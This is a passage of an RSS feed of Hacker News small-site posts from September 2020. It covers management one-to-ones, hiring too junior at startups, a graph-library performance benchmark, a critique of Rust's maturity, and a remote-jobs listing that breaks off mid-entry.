  <li>‚ÄúIt broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn‚Äôt ever work with directly so it was good to feel that you knew I existed.‚Äù</li>
  <li>‚ÄúThere is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn‚Äôt do the 1:1, the answer of the question below ‚ÄúDo you feel able to raise issues with me?‚Äù would be ‚ÄúNo‚Äù.‚Äù</li>
  <li>‚ÄúWe sat down when you first started and it was nice to get some one-to-one time because it‚Äôs not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it‚Äôs important to know if the person you are raising them to is receptive.‚Äù</li>
  <li>‚ÄúIt really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you‚Äù</li>
  <li>‚ÄúI think often of that conversation‚Äù</li>
</ul>

<h2 id="did-it-make-them-feel-more-able-to-raise-issues-with-me">Did it make them feel more able to raise issues with me?</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.annashipman.co.uk/jfdi/meeting-everyone.html">https://www.annashipman.co.uk/jfdi/meeting-everyone.html</a></em></p>]]>
            </description>
            <link>https://www.annashipman.co.uk/jfdi/meeting-everyone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529176</guid>
            <pubDate>Sat, 19 Sep 2020 17:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reasons Your Growth Startup Is Hiring Too Junior]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529137">thread link</a>) | @svmanager
<br/>
September 19, 2020 | https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Growth startups often find themselves lacking senior team members as they scale. The problems that arise from this are plentiful, including things like:</p>
<ul>
  <li>Requiring heroics to fix things</li>
  <li>Penalizing junior team members for failure to meet responsibilities well above their pay grade.</li>
  <li>Building technology that doesn‚Äôt scale</li>
</ul>

<p>Here‚Äôs some reasons why companies get into this situation.</p>

<h2 id="reason-1-habit">Reason 1: Habit</h2>

<p>When you‚Äôre a tiny startup budgets are extremely lean and products don‚Äôt have a lot of users. In that environment companies often prioritize breadth of functionality (see what works) and getting that via several (more affordable) junior team members guided by a smaller group of senior team members.</p>

<p>Problems arise if that strategy exists past market fit. The add-a-junior-to-do-more strategy implodes as the team grows too large for the senior staff to manage closely and the technical challenges start to look more daunting.</p>

<h2 id="reason-2-hubris">Reason 2: Hubris</h2>

<p>Sometimes people recognize the problems are getting more difficult but still don‚Äôt hire more seniors. This can often be chalked up to hubris - surely I can just direct a bunch of juniors to execute on the genius solutions I come up with for all our problems. The problem here is that you‚Äôre not a genius and even if you were that strategy doesn‚Äôt scale.</p>

<h2 id="reason-3-fear">Reason 3: Fear</h2>

<p>The flip side of hubris is fear. New senior staff can look like a threat to the power of existing senior staff. You might have to choose between doing what‚Äôs right for the company and retaining certain kinds of power. The answer there is simple - it‚Äôs better to be part of something great than the owner of something that fails.</p>

<p>A different play on this theme is junior teammates fearing that new senior teammates will take away some of their opportunities. It‚Äôs possible, sure. But more often the opportunities they will take over are the ones juniors would have had trouble succeeding in.</p>

<p>In a growing company with reasonably difficult challenges, good seniors will do more to expand the set of opportunities than shrink them. And good senior talent will help juniors via mentorship and guidance.</p>

<h2 id="reason-4-money-issues">Reason 4: Money Issues</h2>

<p>Money issues play out in a couple ways.</p>

<p>First, the cost of senior talent can subconsciously make you concerned about the remaining budget for yourself. I haven‚Äôt seen this played out directly and blatantly, but it‚Äôs another version of the fear game - assuming compensation is a zero sum game leads to weird incentives.</p>

<p>Second, it‚Äôs easy to think 2 juniors are better than one senior. As you read about the myth of the 10x engineer you might find yourself thinking this way. Let‚Äôs talk more about how this is a misconception in reason 5‚Ä¶</p>

<h2 id="reason-5-miscalculation-of-necessary-skills-for-right-now">Reason 5: Miscalculation of Necessary Skills For Right Now</h2>

<p>As referenced earlier, problems get much harder when you add significant growth to a platform. It‚Äôs not uncommon to underestimate the challenges at hand. In reality, even simple products at massive scale need significant senior leadership to ensure they are being built and operated effectively. Trying to replace the leadership of senior talent with a volume of junior talent is a sure-fire way to screw this up.</p>

<h2 id="reason-6-miscalculation-of-necessary-skills-in-the-future">Reason 6: Miscalculation of Necessary Skills In the Future</h2>

<p>To make things more difficult, you don‚Äôt just have to hire for right now, you have to hire for 2 or more years in the future. The senior talent you hire now must seed the leadership ranks you need in the future. Especially in product and engineering, you can‚Äôt just hire everyone you need when you need them. For starters, the job market would laugh at that sort of just-in-time attempt at hiring. But also, these roles require much more detailed understanding of the systems at play, so you need to have people with intimate knowledge developed in advance.</p>

<p>Think of it this way - look at whatever company you‚Äôre trying to be like in 5 years. Look at their team. If you don‚Äôt start hiring towards something like that team sooner rather than later you‚Äôll never be that company.</p>

<h2 id="reason-7-arguments-about-what-seniors-need">Reason 7: Arguments About What-Seniors-Need</h2>

<p>Another reason people hire too junior is thinking around senior talent needing explicit areas of responsibility that don‚Äôt overlap. This is the ‚Äúone alpha‚Äù theory - that senior talent can‚Äôt collaborate productively and need their own pack. There might be some nuggets of truth here, but most of it is nonsense. That‚Äôs like NASA saying they couldn‚Äôt have smart people work together on getting to the moon because these great scientists need their own domains.</p>

<p>Ultimately you have to look at the problems you‚Äôre solving. If they are truly challenging they can support a number of seniors. If they aren‚Äôt you‚Äôll probably have trouble hiring and retaining more than a few.</p>

<h2 id="conclusion">Conclusion</h2>

<p>There‚Äôs a lot of reasons why you might hire too junior as your company grows. Know them and hire intentionally.</p>


    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529137</guid>
            <pubDate>Sat, 19 Sep 2020 17:39:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twister OS: Make Raspberry Pi Look Like Windows or macOS]]>
            </title>
            <description>
<![CDATA[
Score 138 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24528732">thread link</a>) | @yboris
<br/>
September 19, 2020 | https://twisteros.com/index.html | <a href="https://web.archive.org/web/*/https://twisteros.com/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Twister OS 2020 | <a href="https://discord.gg/Fh8sjmu" target="_blank">Join our Discord!</a></p></div></div>]]>
            </description>
            <link>https://twisteros.com/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528732</guid>
            <pubDate>Sat, 19 Sep 2020 16:50:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Benchmark of popular graph/network packages]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526881">thread link</a>) | @dvfjsdhgfv
<br/>
September 19, 2020 | https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/ | <a href="https://web.archive.org/web/*/https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        



<p><strong>This post is superseded by an <a href="https://www.timlrx.com/2020/05/10/benchmark-of-popular-graph-network-packages-v2/">updated benchmark</a></strong></p>
<p>In this post I benchmark the performance of 5 popular graph/network packages. This was inspired by two questions I had:</p>
<ol>
<li><p>Recently, I have been working with large networks (millions of vertices and edges) and often wonder what is the best currently available package/tool that would scale well and handle large scale network analysis tasks. Having tried out a few (networkx in Python and igraph in R) but on different problems, I thought it would be nice to have a head to head comparison.</p></li>
<li><p>Running large scale computations is also much easier nowadays with the availability of virtual machines that could be easily spinned up thanks to the growth of cloud computing. I think the trend of powerful single machines will eliminate a lot of the need for enterprise clusters so it will be interesting to see how far we can push a single machine using optimised algorithms.<a href="#fn1" id="fnref1"><sup>1</sup></a></p></li>
</ol>
<p>To replicate the benchmark study and for the full codes, please refer to <a href="https://github.com/timlrx/graph-benchmarks">my github repository</a>. Instructions on how to setup and install the packages are also located in the repository.</p>
<div id="setup">
<h2>Setup</h2>
<p>The benchmark was carried out using a Google Compute n1-standard-16 instance (16vCPU Haswell 2.3GHz, 60 GB memory). I compare 5 different packages:</p>
<ul>
<li><a href="https://graph-tool.skewed.de/">graph-tool</a></li>
<li><a href="https://igraph.org/redirect.html">igraph</a></li>
<li><a href="https://networkit.github.io/">networkit</a></li>
<li><a href="https://networkx.github.io/">networkx</a></li>
<li><a href="https://snap.stanford.edu/snappy/">snap</a></li>
</ul>
<p>Networkx is written in Python while the other four packages are based on C / C++ but have Python APIs. Igraph has a R and Mathematica binding as well but to be consistent the following benchmark was based on the Python one. The other 3 libraries (snap, networkit and graph-tool) have an additional emphasis on performance with multi-processing capabilities built in.</p>
<p>Selecting what tasks to compare on is not really a trivial task with each package offering various tools and capabilities. In the end, I decided to focus on 5 specific problems:</p>
<ul>
<li>loading the data</li>
<li>single source shortest path</li>
<li>page rank</li>
<li>k-core decomposition</li>
<li>strongly connected components</li>
</ul>
<p>Loading is more of an I/O task while the other 4 are common graph algorithms. Disclaimer: I try as much as possible to specify the same parameters for each algorithm but differences in API across the packages could translate to actual differences in how the algorithm is run and the final output.</p>
<p><span>13/12/2019 Edit: Some of the observed differences in performance might be a result of different stopping criteria used - see algorithms for more information.</span></p>
<p>3 datasets from the <a href="https://snap.stanford.edu/data/index.html">Stanford Large Network Dataset Collection</a> were used in the exercise:</p>
<ul>
<li><a href="https://snap.stanford.edu/data/amazon0302.html">amazon</a>, 262k nodes, 1.2m edges</li>
<li><a href="https://snap.stanford.edu/data/web-Google.html">google</a>, 875k nodes, 5.1m edges</li>
<li><a href="https://snap.stanford.edu/data/soc-Pokec.html">pokec</a>, 1.6m nodes, 30.6m edges</li>
</ul>
<p>While it is the easiest to rank the packages based on the run-time of the algorithms, it is only one of the many considerations of what makes a good package. I try to offer a more subjective view based on my experience with these packages.</p>
</div>

<div id="results">
<h2>Results</h2>
<p>All timings reported are normalised to reflect the run time for a single run of the task.</p>
<p>Networkx is much slower than any of the other libraries. Across all computation tasks and for all datasets it is around 10 times slower than the <em>slowest</em> library.<a href="#fn2" id="fnref2"><sup>2</sup></a> For example, it took 67s to run the single source shortest path problem on the Pokec dataset compared to 6.8s for networkit (the next slowest). Page rank took more than 10 minutes to run compared to 1 minute for igraph. Hence, I left it out of the comparison plots.</p>
<p>Here are the run times of the remaining four packages:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/b13c3d06c53af36cafd2b861d21948ee7613dd3a/3c0f3/post/2019-05-05-benchmark-of-popular-graph-network-packages_files/figure-html/plot_all-1.png" width="672"></p>
<p>Full results can be seen from the table below:</p>
<table>
<thead>
<tr>
<th>
dataset
</th>
<th>
Algorithm
</th>
<th>
graph-tool
</th>
<th>
igraph
</th>
<th>
networkit
</th>
<th>
networkx
</th>
<th>
snap
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
Amazon
</td>
<td>
connected components
</td>
<td>
0.09
</td>
<td>
0.48
</td>
<td>
0.21
</td>
<td>
5.94
</td>
<td>
0.40
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
k-core
</td>
<td>
0.11
</td>
<td>
0.33
</td>
<td>
0.01
</td>
<td>
8.62
</td>
<td>
0.42
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
loading
</td>
<td>
5.00
</td>
<td>
0.79
</td>
<td>
3.27
</td>
<td>
9.96
</td>
<td>
1.90
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
page rank
</td>
<td>
0.05
</td>
<td>
1.59
</td>
<td>
0.01
</td>
<td>
25.71
</td>
<td>
0.90
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
shortest path
</td>
<td>
0.06
</td>
<td>
0.12
</td>
<td>
0.32
</td>
<td>
3.31
</td>
<td>
0.14
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
connected components
</td>
<td>
0.32
</td>
<td>
2.23
</td>
<td>
0.65
</td>
<td>
21.71
</td>
<td>
2.02
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
k-core
</td>
<td>
0.57
</td>
<td>
1.68
</td>
<td>
0.06
</td>
<td>
153.21
</td>
<td>
1.57
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
loading
</td>
<td>
67.27
</td>
<td>
5.51
</td>
<td>
17.94
</td>
<td>
39.69
</td>
<td>
9.03
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
page rank
</td>
<td>
0.76
</td>
<td>
5.24
</td>
<td>
0.12
</td>
<td>
106.49
</td>
<td>
4.16
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
shortest path
</td>
<td>
0.20
</td>
<td>
0.69
</td>
<td>
0.98
</td>
<td>
12.33
</td>
<td>
0.30
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
connected components
</td>
<td>
1.35
</td>
<td>
17.75
</td>
<td>
4.69
</td>
<td>
108.07
</td>
<td>
15.28
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
k-core
</td>
<td>
5.73
</td>
<td>
10.87
</td>
<td>
0.34
</td>
<td>
649.81
</td>
<td>
8.87
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
loading
</td>
<td>
119.57
</td>
<td>
34.53
</td>
<td>
157.61
</td>
<td>
237.72
</td>
<td>
59.75
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
page rank
</td>
<td>
1.74
</td>
<td>
59.55
</td>
<td>
0.20
</td>
<td>
611.24
</td>
<td>
19.52
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
shortest path
</td>
<td>
0.86
</td>
<td>
0.87
</td>
<td>
6.87
</td>
<td>
67.15
</td>
<td>
3.09
</td>
</tr>
</tbody>
</table>
<div id="io">
<h3>I/O</h3>
<p>Looking at the plots above, graph-tool and networkit loads data much more slowly than the other two libraries. I was reading the datasets as a tab delimited file and graph-tool basically uses a Python code to parse the input. The other 3 packages should be using C libraries to read the files which result in better performance.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
</div>
<div id="algorithms">
<h3>Algorithms</h3>
<p>Networkit and graph-tool takes the top spot in most of the tests with graph-tool having the shortest run time for the single source shortest path and connected components problems and networkit winning the race for k-core and page rank.</p>
<p>When networkit is fast, it is extremely fast. On the pokec dataset it takes just 0.2s to run the page rank algorithm (graph-tool: 1.7s, igraph: 59.6s, snap: 19.5s). For the k-core decomposition it is also 10 times faster than all other competitors or 2000 times networkx. That is consistent with the findings of their research paper where they claim that using some of the latest state of the art algorithms led to their processing speed being faster by an order of magnitude. However, for the shortest path problem (not analysed in their paper) it lags behind all other packages.<a href="#fn4" id="fnref4"><sup>4</sup></a></p>
<p><span>13/12/2019 Edit: Matthew Galati from SAS pointed out that for the pagerank algorithm, networkit (as of version 6.0) uses L2 norm as a stopping criteria while other packages use the L1 norm. This means that it is doing fewer iterations and the speed is somewhat artificial. Thanks Matthew!</span></p>
<p>graph-tool is the most steady performer and achieves very impressive performance across all four tasks. With openMP support it betters igraph and snap across all tasks. It is 3 to 10+ times faster than those two packages.</p>
<p>igraph and snap achieves mostly similar performance across all tasks with a slight edge towards snap. This is also consistent with snap‚Äôs research findings.</p>
</div>
<div id="other-considerations">
<h3>Other Considerations</h3>
<p>There are also other important considerations when making a switch from networkx or igraph to one graph-tool or networkit.</p>
<p><strong>Packages</strong><br>
First, the algorithms available differ quite significantly across the packages. Users interested in switching to one of these packages should read the documentation on the list of features available. For example, while they all contain the basic tools needed to manipulate networks, graph-tool does not have the more usual modular clustering tools but has additional functionalities on statistical inference on graphs using stochastic block models.</p>
<p>Visualising networks is also an important part of the analytical tool chain. Igraph implements quite a few layout algorithms and renders them using the cairo library. Snap supports graphviz while graph-tool supports both graphviz and cairo. Networkit takes a different approach and relies on networkx to draw while also providing support and integration with Gephi via its streaming plugin.</p>
<p><strong>API</strong><br>
Moving away from native Python or R means that the syntax for the packages can sometimes be quite convoluted. I compare the syntax for the shortest path problem below. Writing it in networkx would look something like this:</p>
<pre><code>nx.shortest_path_length(g, nodeid)</code></pre>
<p>igraph:</p>
<pre><code>g.shortest_paths([g.vs[node_index]])</code></pre>
<p>graph-tool:</p>
<pre><code>shortest_distance(g, g.vertex(node_index))</code></pre>
<p>networkit:</p>
<pre><code>distance.BFS(g, node_index).run()</code></pre>
<p>snap:</p>
<pre><code>NIdToDistH = snap.TIntH()
snap.GetShortPath(g, node_index, NIdToDistH, True)</code></pre>
<p>Of all, I find snap‚Äôs the most cumbersome since one has to define an additional variable (with the correct variable type) to store the results before running it. Running more advanced functions on graph-tool and networkit also requires a user to pre-define variables with the correct type to store results.<a href="#fn5" id="fnref5"><sup>5</sup></a></p>
<p><strong>Support and Documentation</strong><br>
User support and documentation is really important when one wants to use the project in an actual project setting. Networkx is by far the winner in this category with more than 4k github stars and lots of issues documented in github and stackoverflow. Igraph fairs decently as well with more than a thousand stars across its different modules.</p>
<p>graph-tool and networkit has much smaller followings though the creators seem relatively responsive to user issues and the packages are in active development.</p>
<p>snap was last updated on July 2018 but still supports only Python 2.7.x versions.</p>
</div>
<div id="conclusion">
<h3>Conclusion</h3>
<p>Overall, I am pleasantly surprised at the performance of the libraries especially graph-tool and networkit and plan to play around with them further. The fact that they breeze through the Pokec dataset is a good sign, but it will be interesting to find out what is the limit before computation becomes slow or memory issues start appearing.</p>
<p>As for recommendations on which package people should learn, I think picking up networkx is still important as it makes network science very accessible with a wide range of tools and capabilities. If analysis starts being too slow (and maybe that‚Äôs why you are here) then I will suggest taking a look at graph-tool or networkit to see if they contain the necessary algorithms for your needs.</p>
</div>
</div>



        
          
        

        

        
      </article>

      
        
      


      

    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526881</guid>
            <pubDate>Sat, 19 Sep 2020 12:09:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Rust is not a mature programming language]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 67 (<a href="https://news.ycombinator.com/item?id=24526861">thread link</a>) | @DarkCrusader2
<br/>
September 19, 2020 | https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/ | <a href="https://web.archive.org/web/*/https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>While I have nothing against Rust as such and keep writing my pet project in Rust, there are still some deficiencies I find preventing Rust from being a proper programming language. Here I‚Äôd like to present them and explain why I deem them as such even if not all of them have any impact on me.<br>
<span id="more-1971"></span></p>
<h3>Rust language problems</h3>
<p>First and foremost, <strong>Rust does not have a formal language specification</strong> and by that I mean that while some bits like grammar and objects are explained, there are no formal rules to describe what language features can and cannot be. If you‚Äôve ever looked at ISO C standard you‚Äôve seen that almost any entity there has three or four parts in the description: formal syntax, constraints (i.e. what is not allowed or what can‚Äôt be done with it), semantics (i.e. what it does, how it impacts the program, what implementation caveats are there), and there may be some examples to illustrate the points. The best close equivalent in Rust is <a href="https://doc.rust-lang.org/reference/" rel="noopener noreferrer" target="_blank">The Rust Reference</a> and e.g. structure there is described in the following way: syntax (no objections there), definition in a form of ‚ÄúA struct is a nominal struct type defined with the keyword <code>struct</code>.‚Äù, examples, a brief mention of empty (or unit-like) structures in the middle of examples, and ‚ÄúThe precise memory layout of a struct is not specified.‚Äù at the end. I understand that adding new features is more important than documenting them but this is lame.</p>
<p>A proper mature language (with 1.0 in its version) should have a formal specification that should be useful both for people developing compilers and the programmers trying to understand certain intricacies of the language and why it does not work as expected (more on that later). For example, for that <code>struct</code> definition I find lacking at least these: mentioning that you can have <code>impl</code> for it (even a reference would do‚Äîeven if you have to repeat it for every type), split off tuples into a separate entry because it‚Äôs very different syntactically and raises a question why you have anonymous tuples and not anonymous structs (which you also can‚Äôt find from the documentation), and of course create proper layout so that rather important information (about memory layout for example) is not lost among examples.</p>
<p>And now to the specific problems I encounter quite often and I don‚Äôt know whether I understand it wrong or the compiler understands it wrong. And since there‚Äôs no formal specification I can‚Äôt tell which one it is (even if the former is most probable).</p>
<p><strong>Function/method calling convention.</strong> Here‚Äôs a simple example:</p>
<blockquote><p>
struct Foo { a: i32 }<br>
impl Foo { fn bar(&amp;mut self, val: i32) { self.a = val + 42; } }<br>
fn main() {<br>
&nbsp; let mut foo = Foo { a: 0 };<br>
&nbsp; foo.bar(foo.a);<br>
}
</p></blockquote>
<p>For now this won‚Äôt compile because of the borrowing but shouldn‚Äôt the compiler be smart enough to create a copy of <code>foo.a</code> before call? I‚Äôm not sure but IIRC current implementation first mutably borrows object for the call and only then tries to borrow the arguments. Is it really so and if yes, why? <em>Update:</em> I‚Äôm told that newer versions of the compiler handle it just fine but the question still stands (was it just a compiler problem or the call definition has been changed?).</p>
<p>The other thing is the old C caveat of function arguments evaluation. Here‚Äôs a simple example:</p>
<blockquote><p>
let mut iter = ‚Äúabc‚Äù.chars();<br>
foo(iter.next().unwrap(), iter.next().unwrap(), iter.next().unwrap());
</p></blockquote>
<p>So would it be <code>foo('a','b','c')</code> or <code>foo('c','b','a')</code> call. In C it‚Äôs undefined because it depends on how arguments are passed on the current platform (consider yourself lucky if you don‚Äôt remember <code>__pascal</code> or <code>__stdcall</code>). In Rust it‚Äôs undefined because there‚Äôs no formal specification to tell you even that much. And it would be even worse if you consider that you may use the same source for indexing the caller object like <code>handler[iter.next().unwrap() as usize].process(iter.next().unwrap());</code> in some theoretical bytecode handler (of course it‚Äôs a horrible way to write code and you should use named temporary variables but it should illustrate the problem).</p>
<p>And another source of annoyance for me is <strong>traits</strong>. I have almost no problems with owning/lifetime/borrowing concepts but traits get me almost every time. I‚Äôm vaguely aware that the answer to why the following problems exist is ‚Äúbecause traits are implemented as a call table‚Äù but again, <em>should</em> they be implemented like that and what should be the constraints on them (after all the original object should be somehow linked to the trait pointer). So when you have a supertrait (i.e. <code>trait Foo: Bar</code>) you can‚Äôt easily cast it for subtrait (e.g. <code>&amp;Foo -&gt; &amp;Bar</code>) without writing a lot of boilerplate code. And even worse if you convert an object into <code>Box&lt;trait&gt;</code> there‚Äôs no way to get the original object back (still in boxed form of course; I remember seeing a special crate that implements a lot of boilerplate code in order to get a mutable reference though). To reiterate: the problem is not me being stupid but rather the lack of formal description on how it‚Äôs done and why what I want is so hard. Then I‚Äôd probably at least be able to realize how I should change my code to work around the limitations.</p>
<h3><code>rustc</code> problems</h3>
<p>No, I‚Äôm not going to talk about compilation speed. It‚Äôs certainly a nuisance but not a problem per se. Here I want to point rather theoretical problems that a mature language should not have. And having just one compiler is one of those problems (call that problem zero).</p>
<p>First of all, <strong>bootstrapping process</strong> is laughably bad. I realize that it‚Äôs never too easy but if you call yourself a systems programming language you should be able to bootstrap a compiler in a sane amount of steps. For instance, IIRC <code>Guix</code> has the following bootstrapping process for C compiler: simple C complier in Scheme (for which you can often write an implementation in assembly by hand) compiles TCC, TCC compiles GCC 2.95, GCC 2.95 compiles GCC 3.7, GCC 3.7 compiles GCC 4.9. For <code>rustc</code> you should either start with the original compiler written in OCaml and compile every following version with the previous one (i.e. 1.17 with 1.16) or cheat by using <code>mrustc</code> written in C++ which can compile Rust 1.19 or 1.29 (without borrow checks), then compile 1.30 with 1.29, 1.31 with 1.30 etc etc. The problem here is that you cannot skip versions and e.g. compile <code>rustc 1.46</code> with <code>rustc 1.36</code> (I‚Äôd be happy to learn that I‚Äôm wrong). IMO you should have maybe an ineffective compiler but written in a dialect that much older compiler should understand i.e. <code>rustc 1.0</code> should be able to compile a compiler for 1.10, which can be used to compile 1.20 and so forth. Of course it‚Äôs a huge waste of resources for rather theoretical problem but it may prove beneficial for compiler design itself.</p>
<p>Then there‚Äôs <strong>LLVM dependency.</strong> I understand that <code>LLVM</code> provides many advantages (like no need to worry about code generation for many platforms and optimising it) but it gives some disadvantages too. First, you don‚Äôt have a really self-hosting compiler (a theoretical problem but still a thing worth thinking about; also consider that you have to rely on a framework developed mostly by large corporations mostly in their own interests). Second, you‚Äôre limited by what it does e.g. I read complaints about debug builds being too slow mostly because of LLVM backend. And I suspect it still can‚Äôt do certain kinds of memory-related optimisations because it was designed with C++ compiler in mind which still has certain quirks regarding multiple memory access (plus IIRC there was one LLVM bug triggered by an infinite loop in Rust code that‚Äôs perfectly valid there but not according to C++ rules). I‚Äôm aware that <code>cranelift</code> exists (and Rust front-end for <code>GCC</code>) so hopefully this will be improved.</p>
<p>And finally there‚Äôs a thing related to the previous problem. Rust has poor <strong>support for assembly</strong>. Of course not so many people need standalone assembly and not inline one (which is still lacking but <code>asm!</code> is almost there) but languages oriented for systems programming support compiling assembly in addition to the higher-language code so it would be <em>proper</em> to support assembly files even with not so rich preprocessor syntax as GAS has. Fiddling with <code>build.rs</code> to invoke an external assembler is possible but not nice at all.</p>
<h3>Other Rust language problems</h3>
<p>There‚Äôs also one problem with Rust <code>std</code> library that I should mention too. It‚Äôs useless for interfacing OS. Now if I want to do something natural to any UNIX system I need to at least import <code>libc</code> crate <del datetime="2020-09-19T03:32:25+00:00">and link against an external libc</del> (it‚Äôs part of the runtime anyway). One solution would be that crate I heard of that wanted to translate <code>musl</code> into Rust so you can at least eliminate the linking step. But the proper solution would be to support at least OS-specific syscall() in <code>std</code> crate as many interesting libc functions are just a wrapper over it (like <code>open()</code>/<code>write()</code>/<code>ioctl()</code>; Windows is a different beast so I don‚Äôt mind if it‚Äôs <code>std::os::unix::syscall</code> and not something more common).</p>
<hr>
<p>I‚Äôm not a Rust language architect and I‚Äôm extremely unlikely to become one but I have an opinion on what Rust lacks in order to become a proper mature language really fit for systems development (three things essentially: being fully self-hosted, having a specification, and being able to interface low-level stuff without resorting to C compiler or assembler). Hopefully this will be rectified despite the lack of Mozilla.</p>

								
				<p>
					<small>
												This entry was posted on Friday, September 18th, 2020 at 2:03 pm and is filed under <a href="https://codecs.multimedia.cx/category/rust/" rel="category tag">Rust</a>, <a href="https://codecs.multimedia.cx/category/useless-rants/" rel="category tag">Useless Rants</a>.						You can follow any responses to this entry through the <a href="https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/feed/">RSS 2.0</a> feed. 

													You can <a href="#respond">leave a response</a>, or <a href="https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/trackback/" rel="trackback">trackback</a> from your own site.
						
					</small>
				</p>

			</div></div>]]>
            </description>
            <link>https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526861</guid>
            <pubDate>Sat, 19 Sep 2020 12:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Philosophers in an influence graph with PageRank scores]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526402">thread link</a>) | @jonersRochen
<br/>
September 19, 2020 | https://s4n0i.github.io/schoolofathens/ | <a href="https://web.archive.org/web/*/https://s4n0i.github.io/schoolofathens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Each node represents a philosopher. Nodes are linked if one philosopher was an influence to the other.
                The size of a node represents the overall influence of a philosopher on the network.</p><p>
                
                Click on a philosopher's node to get more info about them. You can also interact with the graph by dragging nodes, panning and zooming.
            </p></div></div>]]>
            </description>
            <link>https://s4n0i.github.io/schoolofathens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526402</guid>
            <pubDate>Sat, 19 Sep 2020 10:19:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I made a scraper that finds the Best Remote Jobs Every Week on the web]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24526323">thread link</a>) | @xoelop
<br/>
September 19, 2020 | https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/ | <a href="https://web.archive.org/web/*/https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Hey everyone!</p><p>I'm <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">Xoel</a>, the creator of <a href="https://noicejobs.com/" rel="noopener noreferrer">NoiceJobs.com</a>. On this blog, we'll post the best remote jobs found every week, scraped, aggregated and curated from pretty much all job boards in the Internet.</p><p>For example...</p><ul> <li> üëâ üèù <a target="blank" href="https://bit.ly/2RxVom5">Senior Software Developer</a> at <b>Jupiter</b>
<br>
<b>$70,000 - $120,000 USD + Equity depending on experience</b>
<br> üè° Hiring in EU, Canada, US, Mexico, Central &amp; South America, Rest of Europe  <p>‚Ä¢ We're looking for someone to help <strong>build and support new features</strong> as we scale out the product and company. You will be primarily working with <strong>React, React Native, Node.js</strong>, and <strong>GraphQL</strong>.<br>‚Ä¢ We're looking for someone who is particularly interested in creating systems within the constraints of a <strong>start-up</strong>.<br>‚Ä¢ And finally: we're <strong>bootstrapped</strong>, so far, <strong>building a sustainable business we all want to work at</strong>.</p>
